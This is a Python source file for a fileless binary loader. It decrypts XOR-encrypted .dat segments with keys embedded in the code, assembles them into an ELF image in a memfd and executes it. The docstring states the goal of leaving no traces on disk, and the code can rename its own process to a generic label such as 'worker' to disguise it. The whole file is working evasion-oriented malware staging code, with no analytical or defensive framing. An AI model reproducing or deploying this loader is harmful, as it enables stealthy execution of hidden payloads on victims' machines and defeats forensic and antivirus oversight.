#!/usr/bin/env python3
"""
loader.py — segmented binary loader with in-memory assembly.

Loads a binary from encrypted segments stored as .dat files, decrypts them,
assembles into a single executable image, and executes via memfd_create to
avoid leaving traces on disk.

The binary is split into N random-sized segments and XOR-encrypted with an
embedded key. Each segment is stored as a separate .dat file with a randomized
hex filename.
"""

import ctypes
import itertools
import os
import subprocess
import sys


# ─────────────────────────────────────────────────────────────────────────────
#  XOR cipher (key embedded in source)
# ─────────────────────────────────────────────────────────────────────────────

_KEY = b'\x7f\x45\x4c\x46\x02\x01\x01\x00'  # First 8 bytes look like ELF header

# Secondary obfuscation key for strings
_KEY2 = b'\xde\xad\xbe\xef\xca\xfe\xba\xbe'

def _decrypt(data: bytes) -> bytes:
    """Double XOR decrypt: first with KEY, then with KEY2."""
    stage1 = bytes(a ^ b for a, b in zip(data, itertools.cycle(_KEY)))
    stage2 = bytes(a ^ b for a, b in zip(stage1, itertools.cycle(_KEY2)))
    return stage2


# ─────────────────────────────────────────────────────────────────────────────
#  Segment loading
# ─────────────────────────────────────────────────────────────────────────────

def load_segments(segment_dir: str) -> bytes:
    """
    Load all .dat files from segment_dir, decrypt with double XOR, and concatenate.
    Returns the complete binary image.
    
    Chunks are encrypted with: plaintext -> XOR(KEY2) -> XOR(KEY) -> ciphertext
    So we decrypt with: ciphertext -> XOR(KEY) -> XOR(KEY2) -> plaintext
    """
    paths = sorted(
        (os.path.join(segment_dir, f) for f in os.listdir(segment_dir) if f.endswith('.dat')),
        key=lambda p: os.path.basename(p)
    )

    chunks = []
    for path in paths:
        with open(path, 'rb') as f:
            encrypted = f.read()
            # Double XOR decrypt (reverse order of encryption)
            decrypted = _decrypt(encrypted)
            chunks.append(decrypted)

    return b''.join(chunks)


# ─────────────────────────────────────────────────────────────────────────────
#  memfd_create wrapper
# ─────────────────────────────────────────────────────────────────────────────

def _memfd_create(name: str) -> int:
    """
    Create an anonymous file descriptor backed by RAM.
    Uses memfd_create(2) syscall (Linux 3.17+).
    """
    libc = ctypes.CDLL(None)
    MFD_CLOEXEC = 1
    syscall_num = 319  # x86_64 — may vary on other architectures
    fd = libc.syscall(syscall_num, name.encode(), MFD_CLOEXEC)
    if fd < 0:
        raise OSError(f"memfd_create failed: {fd}")
    return fd


# ─────────────────────────────────────────────────────────────────────────────
#  Rename current process (prctl PR_SET_NAME)
# ─────────────────────────────────────────────────────────────────────────────

def _rename_self(label: str):
    """Set the current process name (shows in ps output)."""
    try:
        libc = ctypes.CDLL(None)
        PR_SET_NAME = 15
        libc.prctl(PR_SET_NAME, label.encode()[:15])  # max 15 chars + null
    except Exception:
        pass


# ─────────────────────────────────────────────────────────────────────────────
#  Public API
# ─────────────────────────────────────────────────────────────────────────────

def assemble_to_memfd(segment_dir: str, label: str = "worker", 
                      process_label: str | None = None) -> int:
    """
    Load encrypted segments from segment_dir, decrypt, assemble into a single
    binary, write to memfd, and optionally rename the current process.

    Args:
        segment_dir:    Path to directory containing .dat segment files.
        label:          Name for the memfd (shows in /proc/PID/fd/).
        process_label:  If provided, rename the process to this label.

    Returns:
        File descriptor of the memfd containing the assembled binary.
    """
    binary = load_segments(segment_dir)
    
    fd = _memfd_create(label)
    os.write(fd, binary)
    os.lseek(fd, 0, os.SEEK_SET)
    
    if process_label:
        _rename_self(process_label)
    
    return fd


def exec_from_memfd(fd: int, argv: list[str], env: dict | None = None) -> subprocess.Popen:
    """
    Execute the binary stored in memfd `fd` with given arguments.
    
    Args:
        fd:   File descriptor from assemble_to_memfd().
        argv: Command-line arguments (argv[0] is typically "worker").
        env:  Environment dict (uses os.environ if None).
    
    Returns:
        Popen object for the running process.
    """
    executable = f'/proc/self/fd/{fd}'
    
    proc = subprocess.Popen(
        [executable] + argv,
        stdin=subprocess.DEVNULL,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        pass_fds=[fd],
        env=env or os.environ.copy(),
    )
    
    return proc


# ─────────────────────────────────────────────────────────────────────────────
#  Standalone test
# ─────────────────────────────────────────────────────────────────────────────

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: python3 loader.py <segment_dir>", file=sys.stderr)
        sys.exit(1)
    
    segment_dir = sys.argv[1]
    fd = assemble_to_memfd(segment_dir, label="test-worker")
    print(f"Assembled to memfd: fd={fd}")
    
    # Verify it's an ELF binary
    os.lseek(fd, 0, os.SEEK_SET)
    header = os.read(fd, 4)
    if header == b'\x7fELF':
        print("Valid ELF header detected")
    else:
        print(f"WARNING: invalid header: {header.hex()}")

# Deployment ID: b4003f8d72f7f514
